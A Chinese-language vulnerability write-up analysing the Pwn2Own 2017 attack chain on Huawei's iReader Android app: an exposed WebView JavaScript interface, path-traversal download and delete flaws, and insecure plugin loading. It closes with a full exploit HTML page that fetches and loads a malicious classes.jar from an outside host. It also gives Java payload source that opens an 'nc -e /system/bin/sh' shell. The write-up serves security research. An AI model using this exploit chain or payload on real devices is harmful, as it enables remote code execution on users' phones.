---
title: Pwn2Own华为iReader漏洞原理与利用分析
date: 2018-10-02 09:49:25
tags: Android漏洞
categories: 
	- Android安全
	- 漏洞分析
---

### 0x01 前言
这部分漏洞分析属于之前MWR InfoSecurity的研究员报告中的第三部分,同样该报告仅有漏洞的简单描述，具体的PoC也未详细给出.

因此本文的目的依旧是去探索漏洞挖掘的思路,以下不代表漏洞作者思路,欢迎更好的想法,欢迎讨论。

ps: 附上2017 pwn2own mobile视频

[视频需梯子](https://youtu.be/4Oy7mBeOmDg)

<!-- more -->


### 0x02 漏洞原理分析
同样的挖掘思路,依旧是从**AndroidManifest.xml**入手,寻找暴露的组件,并进行代码静态分析。

``` xml
 <activity android:configChanges="keyboardHidden|layoutDirection|navigation|orientation|screenLayout|screenSize|smallestScreenSize" android:exported="true" android:label=" " android:name="com.zhangyue.iReader.online.ui.ActivityWeb" android:screenOrientation="portrait">
            <intent-filter>
                <data android:host="com.huawei.hwireader" android:scheme="hwireader" />
                <action android:name="com.huawei.hwireader.GLOBAL_SEARCH_CLICKED" />
                <category android:name="android.intent.category.DEFAULT" />
                <category android:name="android.intent.category.BROWSABLE" />
            </intent-filter>
        </activity>
```
切入**com.zhangyue.iReader.online.ui.ActivityWeb**onCreate函数

``` java
  protected void onCreate(Bundle arg8) {
        ...
        
        this.mCoverViewManager = new OnlineCoverViewManager(((Context)this), this.k);
        this.mCoverViewManager.setOnlineActivityOperation(((IOnlineActivityOperation)this));
        this.mOnlineCoverView = this.mCoverViewManager.loadUrlOnNewCoverView("", true, this.getWebViewType());
        this.mProgressWebView = this.mOnlineCoverView.getProgressWebView();
        this.mWebView = this.mProgressWebView.getWebView();//获取webView实例类
        
        ...

        boolean v0_1 = v2 == null || !v2.containsKey("isload") ? true : v2.getBoolean("isload");
        String url = "";
        if(v2 != null && (v2.containsKey("url"))) {
            url = v2.getString("url"); //获取url参数的值
        }

        ...
        
        else if(!(this instanceof ActivityWeb)) {
            if(url != null && !url.equals("")) {
                this.c(url); // 加载url,最终调用loadRefreshUrl(String)函数
                goto label_117;
            }

            this.loadNaviURL(this.c);
            goto label_117;
        }
    }
    

/**
* 加载url,由参数uri控制
**/
protected void loadRefreshUrl(String arg2) {
        this.g = arg2;
        ActivityOnline.mNeedClearHistory = true;
        if(this.mWebView != null) {
            this.mWebView.resetEmptySkip();
            this.mWebView.loadUrl(arg2);  // 加载uri
        }
    }
```

分析onCreate函数代码来看(这里简化了大量代码,使得阅读更加容易)，这里主要是调用webView的loadUrl函数,那么我们自然需要找到webView的实例类,再切入分析.

``` java
public CustomWebView getWebView() {
        return this.mWebView;
    }
```

调用getWebView()函数返回**CustomWebView**类,因为这里仅仅是返回一个已初始化的类,因此,我们需要找到初始化该类的地方,即调用该类的构造函数。

完整的调用是**this.mProgressWebView.getWebView()**,自然我们需要切入mProgressWebView去寻找。我们直接查看引用,即可查找到webview初始化的地方

``` java
protected void initWidgets(WebViewType arg5) {
        ...
        this.mWebView = WebViewFactory.createWebView(arg5, this.mContext); 创建webview
        this.mWebView.setmIsLoadUrlInNewPage(this.i);
        ...
        this.mWebView.setLoadUrlProcesser(((ILoadUrlProcesser)this));
    }
    
```

查看该函数的引用链(jeb直接用x快捷键查找即可)

``` java
public ProgressWebView(Context arg3) {
       ...
       this.init(WebViewType.COMMON_TYPE);
    }


    public void init(WebViewType arg4) {
        this.initWidgets(arg4); //这里调用创建了webView       
        ...
        this.mWebView.init(((OnWebViewEventListener)this));
    }
    
    
    public void init(OnWebViewEventListener arg2) {
        ...
        this.initJavaScript(); //关键点
        ...
    }
    
    protected void initJavaScript() {      
        ...
        this.mJavascriptAction = new JavascriptAction(((AbsDownloadWebView)this));
        WebSettings webSettings = this.getSettings();
        webSettings.setJavaScriptEnabled(true); // 允许执行JS代码
        ...
        this.addJavascriptInterface(this.mJavascriptAction, "ZhangYueJS");// JS接口
    }
            
```

小结一下: 

* 	这里的思路是通过loadUrl最终跟踪webView实例类**CustomWebView**的初始化过程,从而发现initJavaScript函数中可以被调用的接口。
	
* 	但是,我觉得在审计中的思路这样可能比较死板,是不是在这里,直接审计CustomWebView类中的代码,寻找是否有javascript之类的关键词,再回溯去追寻，可能会更快发现。当然如果类代码过多的话,可能有点行不通，我自己在复现的时候，就是通过这种思路，直接找关键词再回溯。

接下来的思路自然是切入类**JavascriptAction**进行代码分析。

#### 任意文件下载/文件目录遍历

快速浏览遍历**@JavascriptInterface**注解的方法,其中**do_command(String cmd)**自然引起注意。

``` java
@JavascriptInterface public void do_command(String cmd) {
    BookHighLight bookHignLight;
    String url;
    Activity mActivity;
    Context mContext;
    Activity currActivity;
    LOG.E("dalongTest", "---------------------------do_command--------------------------");
    if(this.mAbsDowloadWebView == null || !(this.mAbsDowloadWebView.getContext() instanceof Activity)) {
        currActivity = APP.getCurrActivity();
    }
    else {
        Context context_2 = this.mAbsDowloadWebView.getContext();
    }

    if((((Context)currActivity)) == null || currActivity.getParent() == null) {
        mContext = ((Context)currActivity);
    }
    else {
        mActivity = currActivity.getParent();
    }

    try {
        Object obj = new JSONTokener(cmd).nextValue();  // 命令内容参数
        String action = ((JSONObject)obj).getString("Action");  // 获取执行命令动作
        LOG.I("js", "actionName:" + action);            
        ...
        JSONObject data = ((JSONObject)obj).getJSONObject("Data");  // 获取命令内容
        ...
        if(action.equalsIgnoreCase("download")) {
            JSProtocol.mJSBookProtocol.download(data, false, false); //下载漏洞疑点
            return;
        }

		 ...
		 
		if(action.equalsIgnoreCase("chapPackDownload")) {
                JSProtocol.mJSBookProtocol.onChapPack(data);//删除漏洞疑点
                return;
        }

    
        if(action.equalsIgnoreCase("onlineReader")) {
            JSProtocol.mJSBookProtocol.online(data); //下载漏洞疑点
            return;
        }

        if(action.equalsIgnoreCase("readNow")) {
            JSProtocol.mJSBookProtocol.readNow(data);
            return;
        }

        ...
    }
    catch(Exception v2_2) {
        LOG.E("js", "do_command error");
    }
}
```
由于此方法中可执行的命令是非常多的，因此要进行代码审计,这里我认为的一个方式应该是在熟悉Android的一些漏洞，如任意文件下载/替换、任意目录遍历等等的漏洞原理,接着在审计代码的时候,可以快速地切入到可能存在漏洞点的代码进行分析。

这里的调用链路是online()-->download()-->originalDownload()

``` java
public void originalDownload(JSONObject jsonObj, boolean isCarToonParam2, boolean flag_2) {
    downloadInfo = jsonObj.getJSONObject("DownloadInfo");
    ...
    FrmAuth = downloadInfo.optBoolean("getDrmAuth", true);
    fileName = PATH.getBookDir() + downloadInfo.getString("FileName");  // 直接获取json传过来的数据
    fileId = downloadInfo.getInt("FileId");
    dowloadUrl = downloadInfo.getString("DownloadUrl");  // 可控制的下载地址
	 ...
	if(isCarToonParam2) {  // 这里必须为true,否则fileName会被覆盖掉
    d v3_2 = DBAdapter.getInstance().queryBookID(fileId);
    if(v3_2 != null) {
        int[] v1_3 = CartoonTool.getReadPaint(v3_2.j);
        CartoonTool.openCartoon(fileId, v1_3[0], v1_3[1]);
        return;
	    }
	}
	else {
    	fileName = charging.optString("FeeType");//进入该分支,filename被覆盖
    	genreId = downloadInfo.optInt("FeeUnit");
    	if(!fileName.equals("0") && genreId == 10) {
       	 CartoonHelper.setWholeBookPayed(true);
    	}
	}
}
```

可以看到,第二个参数传进来必须为True，才能避免fileName被覆盖,这也是为什么利用online函数而不利用download函数的原因.当然，我们在代码审计的时候肯定是先切入到download函数，分析完后再去寻找是否有符合利用条件的调用接口,很幸运地是,这里的online函数调用的第二个参数即为True.

#### 任意文件删除
在JavaActionScript类中,还有Action为**chapPackDownload**存在漏洞。


``` java
public boolean onChapPack(JSONObject jsonObj) {
    boolean v0_2;
    try {
        int v3 = jsonObj.getInt("StartIndex");
        int v4 = jsonObj.getInt("EndIndex");
        String v2 = jsonObj.getString("Price");
        int v1 = jsonObj.getInt("BookId");
        String v5 = jsonObj.getString("PayURL");
        String v0_1 = jsonObj.getString("DownloadURL");
        String fileName = PATH.getBookDir() + jsonObj.getString("FileName");
        if((FILE.isExist(PATH.getBookNameCheckOpenFail(fileName))) && Device.getNetType() != -1) {
            FILE.delete(PATH.getBookCachePathNamePostfix(fileName));
            FILE.delete(fileName);//没有进行名字校验,直接进行删除
        }

        x.i().a(v1, v2, v3, v4, v5, ManagerFileInternal.getInstance().appendInternalBookParam(v0_1, v1), fileName);
        v0_2 = true;
    }
    catch(Exception v0) {
        v0.printStackTrace();
        v0_2 = false;
    }

    return v0_2;
}
```
分析上面的代码可知,实际上FileName我们可以控制,只要满足**PATH.getBookNameCheckOpenFail(fileName)**该函数路径存在即可。

``` java
public static String getBookNameCheckOpenFail(String arg2) {
        return PATH.getOpenFailDir() + MD5.getMD5(arg2);
        // /sdcard/HWiReader/books/.openfail/md5
        // /sdcard/Android/data/Huawei/HwReader/books/.openfail/md5
    }
public static String getOpenFailDir() {
        return PATH.getWorkDir() + "/books/.openfail/";
    }
public static String getWorkDir() {
        return SDCARD.getStorageDir() + PATH.HW_ROOT_DIR;
        /*
        PATH.PRI_HW_ROOT_DIR = "HWiReader";
        PATH.HW_ROOT_DIR_ABOVE_EMUI6_0 = "Android/data/Huawei/HwReader";
        PATH.HW_ROOT_DIR = PATH.PRI_HW_ROOT_DIR;
        if(Utils.getEMUISDKINT() >= 14) {
            PATH.HW_ROOT_DIR = PATH.HW_ROOT_DIR_ABOVE_EMUI6_0;
        }
        */
    }
public static String getStorageDir() {
        return SDCARD.a();
    }
private static String a() {
        String v0 = "";
        if(!TextUtils.isEmpty(SDCARD.b)) {
            v0 = SDCARD.b;
        }
        else if(SDCARD.hasSdcard()) {
            v0 = Environment.getExternalStorageDirectory().toString();
            SDCARD.b = v0;
        }

        return v0 + "/";
    }    

```
根据以上代码,也即是存在路径**/sdcard/HWiReader/books/.openfail/md5(fileName)**即可实现删除任意文件。

#### 不安全组件加载
寻找不安全的组件加载漏洞,挖掘思路自然是需要分析应用的目录结构,我们通过查看sdcard和data/沙盒中有关iReader应用的目录,查看是否有加载so/dex/jar等等需要动态加载的组件。

经过分析，我们找到**/sdcard/HWiReader/plugins/DFService/classes.jar**,接下来自然是全局搜索相关字符串关键词,定位到加载该组件的地方。最终定位为:**com.zhangyue.iReader.tools.Util**

``` java
//bk.p
 protected final ArrayList P() {
    ...
    Object v2 = Util.loadPlug(APP.getAppContext(), v3.getPlugDir("DFService") + "classes.jar", "com.zhangyue.iReader.Plug.Service.DocFeature").newInstance();
    ...        
}

//com.zhangyue.iReader.tools.Util
 public static Class loadPlug(Context arg4, String arg5, String arg6) throws Exception {
     return new DexClassLoader(arg5, arg4.getApplicationInfo().dataDir, null, arg4.getClassLoader()).loadClass(arg6);
}
       
```

接下来需要解决两个问题:

1. 加载classes.jar,并且初始化的类怎么去构造？

	这个只需查看loadClass(arg6),传进来的参数是什么即可。很显然，这里为**com.zhangyue.iReader.Plug.Service.DocFeature**
	
2. 怎么让iReader App去加载这个jar文件？

	这一步骤只需往前追溯调用链即可寻找到触发点。
	最终的触发点为:下载txt文件。

### 0x03 漏洞利用
#### 前面两部分的漏洞利用分析

* [Pwn2Own华为HiApp漏洞原理与利用分析(上)](http://www.freebuf.com/terminal/172780.html)

* [Pwn2Own华为HiApp漏洞原理与利用分析(下)](http://www.freebuf.com/vuls/173921.html)

#### 第三阶段的漏洞利用exploit代码如下:

``` javascript
<!DOCTYPE html>
<html>
<head>
	<title> exploit iReader stage 3 </title>
</head>
<body>
	<script type="text/javascript">

		// 首先构造任意文件删除攻击连
		function create_hash()
		{
		   var  HASH_FILE_ID = '123456';
		   var  HASH_URI = 'http://www.tasfa.cn/classes.jar';
		   var json ='{"Action":"onlineReader","Data":{"Charging":{"FeeType":0,"OrderUrl":"http://192.168.137.1:8001/aaaaa","Price":"0"},"DownloadInfo":{"ChapterId":"1","FeeUnit":10,"Type":"1","FileId":"'+ HASH_FILE_ID +'","FileName":".openfail/5457bea93d0548a4d84357308df45322","FileSize":10000000,"Ebk3DownloadUrl":"' + HASH_URI + '","DownloadUrl":"' + HASH_URI + '","Version":"2"}}}';
		   window.ZhangYueJS.do_command(json);
		}

		function delete_file()
		{
		   var json = '{"Action":"chapPackDownload","Data":{ "StartIndex": 0, "EndIndex" : 0,"Price" : "0", "BookId" : 0, "PayURL" : 0, "DownloadURL" : "aaa", "FileName" :"../plugins/DFService/classes.jar" } }';
		   window.ZhangYueJS.do_command(json);
		   download_plugin();

		}

		//下载不安全加载组件classes.jar
		function download_plugin()
		{
		 	var PLUGIN_URI = "http://www.tasfa.cn/classes.jar";
		 	var PLUGIN_FILE_ID = '123456';
		    var json ='{"Action":"onlineReader","Data":{"Charging":{"FeeType":0,"OrderUrl":"http://192.168.137.1:8001/aaaaa","Price":"0"},"DownloadInfo":{"ChapterId":"1","FeeUnit":10,"Type":"1","FileId":"' + PLUGIN_FILE_ID + '","FileName":"../plugins/DFService/classes.jar","FileSize":10000000,"Ebk3DownloadUrl":"' + PLUGIN_URI + '","DownloadUrl":"' + PLUGIN_URI + '","Version":"2"}}}';
			window.ZhangYueJS.do_command(json);
		}

		var TEXT_FILE_ID = "334455";
		var TEXT_FILE_NAME = "../plugins/DFService/test.txt";
		var TEXT_URI = "http://www.tasfa.cn/test.txt";

		//触发组件进行加载
		function download_text()
		{
			var json = '{"Action":"readNow","Data":{"Charging":{"FeeType":0,"OrderUrl":"http://192.168.137 .1:8001/aaaaa","Price":"0"},"DownloadInfo":{"ChapterId":"1","FeeUnit":10,"Type":"1" ,"FileId":"' + TEXT_FILE_ID + '","FileName":"' + TEXT_FILE_NAME + '","FileSize":10000000,"Ebk3DownloadUrl":"' + TEXT_URI + '","DownloadUrl":"' + TEXT_URI + '","Version":"2"}}}';
			window.ZhangYueJS.do_command(json);
			setTimeout(trigger_plugin_load,5000);

		}

		//触发payload执行
		function trigger_plugin_load()
		{
			var json = '{"Action":"readNow","Data":{"Charging":{"FeeType":0,"OrderUrl":"http://192.168.137 .1:8001/aaaaa","Price":"0"},"DownloadInfo":{"ChapterId":"1","FeeUnit":10,"Type":"1" ,"FileId":"' + TEXT_FILE_ID + '","FileName":"' + TEXT_FILE_NAME + '","FileSize":10000000,"Ebk3DownloadUrl":"' + TEXT_URI + '","DownloadUrl":"' + TEXT_URI + '","Version":"2"}}}';
			window.ZhangYueJS.do_command(json); 
		}
			
		function exploit() {
			create_hash();
			delete_file();
			setTimeout(download_text,15000);
		}

		exploit();
	</script>

</body>
</html> 
```
这里要注意两个点:

1. setTimeout所延迟的时间必须是根据自己VPS连接速度来设定。
2. 里面有两个FILE_ID，必须保证对应相等。

#### classes.jar构造Payload如下:

``` java
package com.zhangyue.iReader.Plug.Service;

import android.util.Log;
import java.io.IOException;

public class DocFeature extends Thread{
    public DocFeature() {
        run();
        Log.e("ATTACKER","RUNNING ARBITRARY CODE!");
    }

    @Override
    public void run() {
        String command = "nc -l -p 28888 -e /system/bin/sh";
        Runtime runtime = Runtime.getRuntime();
        try {
            runtime.exec(command);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```
Build后,在Android Studio工程下,找到**/app/build/intermediates/classes/debug**目录,然后执行以下命令生成jar.

`dx --dex --output=/Downloads/classes.jar com/zhangyue/iReader/Plug/Service/DocFeature.class`

这里有小坑:

1. 代码中由于classpath的原因,因此无法在代码中直接使用new Thread去创建线程。
2. 执行dx命令时,必须是在完整的结构目录路径下。 
3. nc命令需要下载busyBox.

#### 漏洞利用效果
![](/Users/tasfa/Desktop/桌面/漏洞研究/APP漏洞/华为IReader漏洞/last.gif) 

备注: 完整的利用视频时间较长,因此剪辑掉等待的部分。  

### 0x04 总结
1. 诱导用户访问恶意网站(exploit.html)
2. 使用DNS劫持或其他方式,绕过internal_webview的域名白名单限制,使其加载恶意页面(exploit2.html)
3. 从而调用起iReader的ActivityWeb,使其加载恶意攻击页面(exploit3.html)
4. exploit3.html首先删除可被控制的classes.jar（任意删除文件漏洞）
5. 接着下载恶意的classes.jar（任意下载文件漏洞）
6. 最后使用下载txt文件的方式触发App加载classes.jar（不安全组件加载）
7. 最终触发payload执行,攻击者获取权限.


### 0x05 参考
[Android插件化开发之DexClassLoader动态加载dex、jar小Demo](https://blog.csdn.net/u011068702/article/details/53263442)



